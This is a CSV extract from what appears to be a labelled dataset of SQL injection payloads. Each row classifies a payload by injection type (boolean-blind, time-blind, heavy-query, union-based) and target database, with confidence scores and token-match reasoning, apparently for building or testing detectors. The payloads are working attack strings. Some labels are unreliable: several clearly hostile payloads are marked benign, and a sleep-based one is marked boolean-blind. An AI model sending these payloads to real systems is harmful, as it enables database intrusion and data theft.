id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19544,"1%"" and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,"Token match: 'weak signal','rdb$fields','rdb$types' -> boolean_blind (priority P3); db_engine=firebird from evidence ['rdb$fields', 'rdb$types', 'rdb$collations', 'rdb$functions', 'rdb$']; payload snippet: '1%"" and 9254 = ( select count ( * ) from rdb$field'",3
19545,"iif ( 2869 = 9448,1,1/0 )",boolean_blind,generic,0.65,"Token match: 'iif(N=N,...)' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: 'iif ( 2869 = 9448,1,1/0 )'",1
19546,"1%' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: '1%' ) and 8407 = ( select count ( * ) from generat'",3
19547,"1'+ ( select 'kqnj' where 9483 = 9483 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,generic,0.95,Token match: 'rlike/elt' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1'+ ( select 'kqnj' where 9483 = 9483 or elt ( 587',3
19548,1%' ) ) ) and 4595 = 4595#,boolean_blind,generic,0.95,Token match: 'and 4595 = 4595' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1%' ) ) ) and 4595 = 4595#',3
19549,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'aytf' like 'aytf",time_blind,sqlite,0.9,"Token match: 'randomblob','randomblob' -> time_blind (priority P5); db_engine=sqlite from evidence ['randomblob']; payload snippet: '1' or 8384 = like ( 'abcdefg',upper ( hex ( random'",2
19550,"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'tqvy' like 'tqvy",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1' and 5556 = ( select count ( * ) from all_users ',3
19551,"-1830"" ) ) as bptv where 4805 = 4805 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",boolean_blind,oracle,0.8,"Token match: 'case when','xmltype','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['xmltype', 'dual']; payload snippet: '-1830"" ) ) as bptv where 4805 = 4805 or 4144 = ( s'",2
19552,"-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""ccfn"" = ""ccfn",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""ccfn"" = ""cc'; db_evidence=none; classified benign/generic",2
19553,1' where 2913 = 2913 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,generic,0.8,Token match: 'sleep(' -> time_blind (priority P5); db_engine=generic from evidence generic; payload snippet: '1' where 2913 = 2913 and ( select * from ( select ',2
19554,1' ) ) as dqby where 9256 = 9256,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' ) ) as dqby where 9256 = 9256'; db_evidence=none; classified benign/generic,2
19555,1'|| ( select 'vvpn' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||',boolean_blind,oracle,0.95,"Token match: 'case when','dual' -> boolean_blind (priority P3); db_engine=oracle from evidence ['dual']; payload snippet: '1'|| ( select 'vvpn' from dual where 7011 = 7011 a'",3
19556,"-4047'|| ( select 'rqta' from dual where 9743 = 9743 union all select 9743,9743,9743#",union_based,oracle,0.95,"Token match: 'union all select','dual' -> union_based (priority P7); db_engine=oracle from evidence ['dual']; payload snippet: '-4047'|| ( select 'rqta' from dual where 9743 = 97'",3
19557,"1' where 5251 = 5251 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.8,"Token match: 'rlike/elt','information_schema' -> boolean_blind (priority P3); db_engine=mysql from evidence ['information_schema']; payload snippet: '1' where 5251 = 5251 or ( select 9173 from ( selec'",2
19558,-7548 or 2850 = 9666,boolean_blind,generic,0.95,Token match: 'or 2850 = 9666' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-7548 or 2850 = 9666',3
19559,"-2743 union all select 6757,6757,6757,6757,6757,6757--",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-2743 union all select 6757,6757,6757,6757,6757,67'",3
19560,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'lshk' like 'lshk",benign,generic,0.65,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char '; db_evidence=none; classified benign/generic,1
19561,-8911%' or 9323 = 9323#,boolean_blind,generic,0.95,Token match: 'or 9323 = 9323' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '-8911%' or 9323 = 9323#',3
19562,"1 ) ) and make_set ( 8554 = 3286,3286 ) and ( ( 7385 = 7385",benign,generic,0.8,"No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1 ) ) and make_set ( 8554 = 3286,3286 ) and ( ( 7385 = 7385'; db_evidence=none; classified benign/generic",2
19563,select ( case when ( 6276 = 6276 ) then 6276 else 6276* ( select 6276 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.95,"Token match: 'case when','information_schema' -> boolean_blind (priority P3); db_engine=mysql from evidence ['information_schema']; payload snippet: 'select ( case when ( 6276 = 6276 ) then 6276 else '",3
19564,"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""jywy"" like ""jywy",boolean_blind,mysql,0.65,"Token match: 'case when','extractvalue' -> boolean_blind (priority P3); db_engine=mysql from evidence ['extractvalue']; payload snippet: '1"" ) ) ) procedure analyse ( extractvalue ( 5840,c'",1
19565,"-6200' where 9150 = 9150 union all select 9150,9150,9150,9150,9150,9150,9150#",union_based,generic,0.95,"Token match: 'union all select' -> union_based (priority P7); db_engine=generic from evidence generic; payload snippet: '-6200' where 9150 = 9150 union all select 9150,915'",3
19566,"1 ) as bgvd where 1753 = 1753 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Token match: 'weak signal' -> boolean_blind (priority P3); db_engine=generic from evidence generic; payload snippet: '1 ) as bgvd where 1753 = 1753 and 6510 = ( select ',3
19567,"1"" ) as kdvb where 2651 = 2651 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.95,"Token match: 'weak signal','rdb$' -> boolean_blind (priority P3); db_engine=firebird from evidence ['rdb$']; payload snippet: '1"" ) as kdvb where 2651 = 2651 and 6240 = ( 'qqpjq'",3
19568,1 ) ) as xyuy where 6894 = 6894,benign,generic,0.8,No SQLi signal in payload (no union/sleep/error funcs/comments); payload normalized: '1 ) ) as xyuy where 6894 = 6894'; db_evidence=none; classified benign/generic,2
19569,"1%"" ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"Token match: 'generate_series(large)','generate_series' -> heavy_query (priority P4); db_engine=postgresql from evidence ['generate_series']; payload snippet: '1%"" ) and 8635 = ( select count ( * ) from generat'",3
